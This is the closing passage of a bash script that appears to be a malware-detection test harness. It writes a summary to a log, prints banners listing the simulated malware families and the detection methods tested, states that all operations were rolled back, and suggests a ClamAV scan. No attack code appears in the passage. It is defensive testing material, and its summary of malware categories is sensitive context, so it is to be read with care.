echo "Warnings: $WARNING_COUNT" >> "$LOG_FILE"
echo "Total Scenarios: $SCENARIO_NUM" >> "$LOG_FILE"
echo "Success Rate: ${SUCCESS_RATE}%" >> "$LOG_FILE"
echo "End: $(date)" >> "$LOG_FILE"

echo -e "\n${CYAN}Detailed log: $LOG_FILE${NC}"

echo -e "\n${YELLOW}╔═══════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║${NC} ${WHITE}MALWARE TYPES COVERED${NC}"
echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════════════════════╝${NC}"
echo -e "${BLUE}  ✓ EICAR Test Files${NC} - Standard AV test"
echo -e "${BLUE}  ✓ Web Shells${NC} - PHP, JSP, ASP backdoors"
echo -e "${BLUE}  ✓ Ransomware${NC} - File encryption behavior"
echo -e "${BLUE}  ✓ Crypto Miners${NC} - XMRig simulation"
echo -e "${BLUE}  ✓ Keyloggers${NC} - Input monitoring"
echo -e "${BLUE}  ✓ RAT/Backdoors${NC} - Remote access trojans"
echo -e "${BLUE}  ✓ Rootkits${NC} - System-level hiding"
echo -e "${BLUE}  ✓ Known Malware${NC} - WannaCry, Emotet, etc."
echo -e "${BLUE}  ✓ Polymorphic${NC} - Multiple variants"
echo -e "${BLUE}  ✓ Exploit Kits${NC} - JS, PDF exploits"
echo -e "${BLUE}  ✓ Macro Malware${NC} - Office documents"
echo -e "${BLUE}  ✓ Lateral Movement${NC} - PsExec, Mimikatz"
echo -e "${BLUE}  ✓ Fileless${NC} - Memory-based threats"
echo -e "${BLUE}  ✓ Credential Dumpers${NC} - Password theft"
echo -e "${BLUE}  ✓ Network Scanners${NC} - Recon tools"
echo -e "${BLUE}  ✓ Exfiltration Tools${NC} - Data theft"
echo -e "${BLUE}  ✓ Botnets${NC} - C2 clients"
echo -e "${BLUE}  ✓ Wipers${NC} - Destructive malware"
echo -e "${BLUE}  ✓ Screen Grabbers${NC} - Screenshot malware"
echo -e "${BLUE}  ✓ Browser Hijackers${NC} - Browser modification"
echo -e "${BLUE}  ✓ Adware/PUP${NC} - Unwanted software"
echo -e "${BLUE}  ✓ Banking Trojans${NC} - Financial malware"

echo -e "\n${YELLOW}╔═══════════════════════════════════════════════════════════════════════════╗${NC}"
echo -e "${YELLOW}║${NC} ${WHITE}DETECTION METHODS TESTED${NC}"
echo -e "${YELLOW}╚═══════════════════════════════════════════════════════════════════════════╝${NC}"
echo -e "${BLUE}  ✓ Signature-based${NC} - Known malware patterns"
echo -e "${BLUE}  ✓ Heuristic${NC} - Behavioral analysis"
echo -e "${BLUE}  ✓ Hash-based${NC} - File hash matching"
echo -e "${BLUE}  ✓ Behavioral${NC} - Runtime behavior"
echo -e "${BLUE}  ✓ Location-based${NC} - Suspicious paths"
echo -e "${BLUE}  ✓ Content-based${NC} - File content analysis"
echo -e "${BLUE}  ✓ Archive scanning${NC} - Compressed files"
echo -e "${BLUE}  ✓ Obfuscation detection${NC} - Encoded payloads"

echo -e "\n${GREEN}All operations have been safely executed and rolled back.${NC}"
echo -e "${GREEN}System has been restored to its original state.${NC}"

# ClamAV scan recommendation
if command -v clamscan &> /dev/null; then
    echo -e "\n${YELLOW}Tip: Run ClamAV scan for additional verification:${NC}"
    echo -e "${CYAN}  clamscan -r $SANDBOX_DIR${NC}"
else
    echo -e "\n${YELLOW}Note: ClamAV not installed. Install for additional verification:${NC}"
    echo -e "${CYAN}  sudo apt install clamav clamav-daemon${NC}"
fi

echo -e "\n${BLUE}Press Enter to exit...${NC}"
read